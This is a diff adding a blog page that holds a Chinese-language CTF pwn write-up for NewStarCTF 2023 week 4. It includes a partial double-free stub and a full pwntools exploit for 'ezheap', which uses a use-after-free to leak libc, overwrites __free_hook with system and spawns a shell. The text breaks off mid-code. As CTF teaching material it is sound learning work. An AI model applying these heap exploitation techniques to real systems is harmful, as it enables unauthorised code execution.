@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxx-xx"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'UA-xxxxxx-xx');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="It&#39;s an IT blog..."/>
+  <meta name="keyword" content="v-vincen,v-vincen,livemylife,IT  blog,Blog"/>
+  <link rel="shortcut icon" href="/img/avatar/roguerabbit.jpg"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+
+    
+      <!-- gitalk start -->
+      <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"> -->
+      <link rel="stylesheet" href="/css/gitalk.css"/>
+      <!-- gitalk end -->
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="http://yoursite-url/2023 newstartctf pwn 复盘/2023 newstartctf week4 pwn 复盘/">
+  <title>
+    
+      2023 newstartctf week4 复盘 - either thin | or die
+    
+  </title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--dark">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'dark';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+		<!-- Gitter -->
+<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'your-community/your-room'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">sgud4h5gh</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">HOME</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              ARCHIVES
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              CATEGORIES
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              TAGS
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              ABOUT
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>SEARCH</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+          
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('/img/header_img/newhome_bg.jpg');
+      --intro-header-background-image-url-post: url('1.png');
+      --intro-header-background-image-url-page: url('/1.png');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/newhome_bg.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('1.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/1.png');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('1.png'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('/img/signature/vincent-white.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+              
+            </div>
+            <h1>2023 newstartctf week4 复盘</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by sgud4h5gh on
+              2023-11-16
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">11</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">2.2k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h2 id="Double">Double</h2>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/b5f4554f95754cd61bc6fd5379db6169.png" alt=""></p>
+<p>只有一个add和free，没有打印。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/10d2c36eea9f1637a6ef6220aaf20f70.png" alt=""></p>
+<p>一道double free的题目。<br>
+double free</p>
+<p>free第一次，free掉了chunk2，但是fd是0。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/1e57b533f34082e7969c757cfbd3e1e0.png" alt=""><br>
+free第二次<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/76a0965604e0ff487ab0499eb4ac16a9.png" alt=""><br>
+free第三次<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/818ad5d4e48d36baf4e60d08e85c98b4.png" alt=""><br>
+这个时候我们chunk的fd互相指向对方，我们可以通过构造fake_chunk实现任意地址写。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/9ecf168d74fd6922780f0ef3981dbcd5.png" alt=""></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">io</span>=process(<span class="string">&quot;./Double&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./Double&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def add(idx,content):</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(str(idx))</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">io</span>.recv()</span><br><span class="line">    <span class="built_in">io</span>.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure>
+<h2 id="ezheap">ezheap</h2>
+<h3 id="exp1-mmap泄露libc地址">exp1 - mmap泄露libc地址</h3>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/6163e5ddc02fe3e9fff127db3e183206.png" alt=""><br>
+保护全开<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/db4855cb158d21542b5bba633a41ba09.png" alt=""><br>
+add（）函数，首先创建了一个0x20的堆用来存储信息和一个存放数据的堆。<br>
+第一个堆的最后存放了存放数据的堆的地址。<br>
+首位存放了第二个堆的大小。<br>
+<img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/236909a8554b314c73fd92d35c274d77.png" alt=""><br>
+delete函数没有free掉指针。存在一个uaf漏洞</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>x20,b<span class="string">&#x27;/bin/sh&#x27;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">1</span>,<span class="number">0</span>x40000,b<span class="string">&#x27;dddd&#x27;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>,<span class="number">0</span>x20,b<span class="string">&#x27;bbbb&#x27;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">3</span>,<span class="number">0</span>x20,b<span class="string">&#x27;cccc&#x27;</span>)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">4</span>,<span class="number">0</span>x20,b<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>*<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">4</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>创建堆，中间mmap了一个很大的堆，这样子就可以申请到libc附近。<br>
+创建堆的时候有两个堆，第一个堆存放了地址，我们就可以通过show打印出来</p>
+<p>我们按照顺序delete 1、2，那么再次申请的时候就会按照2、1的顺序申请，<br>
+这样子我们就能控制idx为1的堆的第一个堆了。<br>
+这个时候把第一个堆的内容全部填满，就能通过show函数里面的puts打印出来。</p>
+<p>如图，每个堆后面都有一个config的堆和一个存储内容的堆。<br>
+idx为1的堆只有一个，是因为存储内容的堆太大了，设置到libc附近了。</p>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/0bb528d905678e09de9f2e8b1268a2e3.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/sgud4h5gh/img/main/img/c311c9e65766b8332dcc1d4f5e10b119.png" alt=""></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,p<span class="number">64</span>(<span class="number">0</span>x<span class="number">40000</span>)+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(free_hook))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">1</span>,p<span class="number">64</span>(system))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,b&#x27;/bin/sh\x<span class="number">00</span>&#x27;+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(free_hook))</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>我们先修改free_hook为system。<br>
+再设置idx为1的第一个堆为/bin/sh。这样子free(1)就能得到system(“/bin/sh”)</p>
+<p>那么为什么我们不能delete（0）？<br>
+我们设置了idx为0的第二个堆为/bin/sh，但是我们free是free掉第一个堆，也就是只包含size和addr的堆，不能得到system(“/bin/sh”)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"><span class="attribute">io</span>=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">elf</span>=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="attribute">libc</span>=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="attribute">context</span>.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> cmd(idx):</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> add(idx,size,content):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(str(size))</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> show(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> edit(idx,content):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line">    <span class="attribute">io</span>.recv()</span><br><span class="line">    <span class="attribute">io</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> delete(idx):</span><br><span class="line">    <span class="attribute">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">cmd</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> dbg():</span><br><span class="line">    <span class="attribute">gdb</span>.attach(io)</span><br><span class="line">    <span class="attribute">pause</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">0</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;/bin/sh&#x27;)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">1</span>,<span class="number">0</span>x<span class="number">40000</span>,b&#x27;dddd&#x27;)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">2</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;bbbb&#x27;)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">3</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;cccc&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">4</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;e&#x27;*<span class="number">8</span>*<span class="number">3</span>) #<span class="number">4</span> = <span class="number">2</span> -&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">show</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">io</span>.recvuntil(b<span class="string">&quot;e&quot;</span>*<span class="number">8</span>*<span class="number">3</span>)</span><br><span class="line"><span class="attribute">libc_base</span>=u<span class="number">64</span>(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b&#x27;\x<span class="number">00</span>&#x27;)) - <span class="number">0</span>x<span class="number">10</span> + <span class="number">0</span>x<span class="number">41000</span> + <span class="number">0</span>x<span class="number">2000</span></span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;libc_base -&gt; &quot;</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="attribute">system</span>=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="attribute">free_hook</span>=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,p<span class="number">64</span>(<span class="number">0</span>x<span class="number">40000</span>)+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(free_hook))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">1</span>,p<span class="number">64</span>(system))</span><br><span class="line"><span class="attribute">edit</span>(<span class="number">4</span>,b&#x27;/bin/sh\x<span class="number">00</span>&#x27;+p<span class="number">64</span>(<span class="number">0</span>)*<span class="number">2</span>+p<span class="number">64</span>(free_hook))</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">io</span>.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp2-leak-unsorted-bin得到main-arena的地址">exp2  - leak unsorted_bin得到main_arena的地址</h3>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add</span>(<span class="number">0</span>,<span class="number">0</span>x<span class="number">400</span>,b&#x27;a&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">1</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;b&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">2</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;c&#x27;*<span class="number">4</span>)</span><br><span class="line"><span class="attribute">add</span>(<span class="number">3</span>,<span class="number">0</span>x<span class="number">50</span>,b&#x27;d&#x27;*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">delete</span>(<span class="number">3</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="attribute">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span>(<span class="number">4</span>,<span class="number">0</span>x<span class="number">20</span>,b&#x27;e&#x27;) # <span class="number">4</span> = <span class="number">2</span> -&gt; <span class="number">1</span></span><br><span class="line"><span class="attribute">show</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">stack</span> = u<span class="number">64</span>(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, b&#x27;\x<span class="number">00</span>&#x27;)) -<span class="number">0</span>x<span class="number">865</span></span><br><span class="line"><span class="attribute">success</span>(<span class="string">&quot;stack -&gt; &quot;</span> + hex(stack))</span><br></pre></td></tr></table></figure>
+<p>首先泄露出heap的基地址。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">4</span>,p64(<span class="number">0</span>x50)</span></span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(stack+<span class="number">0</span>x290))</span><br><span class="line">#设置了idx为<span class="number">1</span>的栈指向了idx为<span class="number">0</span>的栈。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">1</span>,p64(<span class="number">0</span>)</span></span>+p64(<span class="number">0</span>x441))</span><br><span class="line">把idx为<span class="number">0</span>的栈设置为</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line">#free掉idx为<span class="number">0</span>的堆，这个时候fd和bk就会保存着libc的地址</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">4</span>,p64(<span class="number">0</span>x50)</span></span>+p64(<span class="number">0</span>)*<span 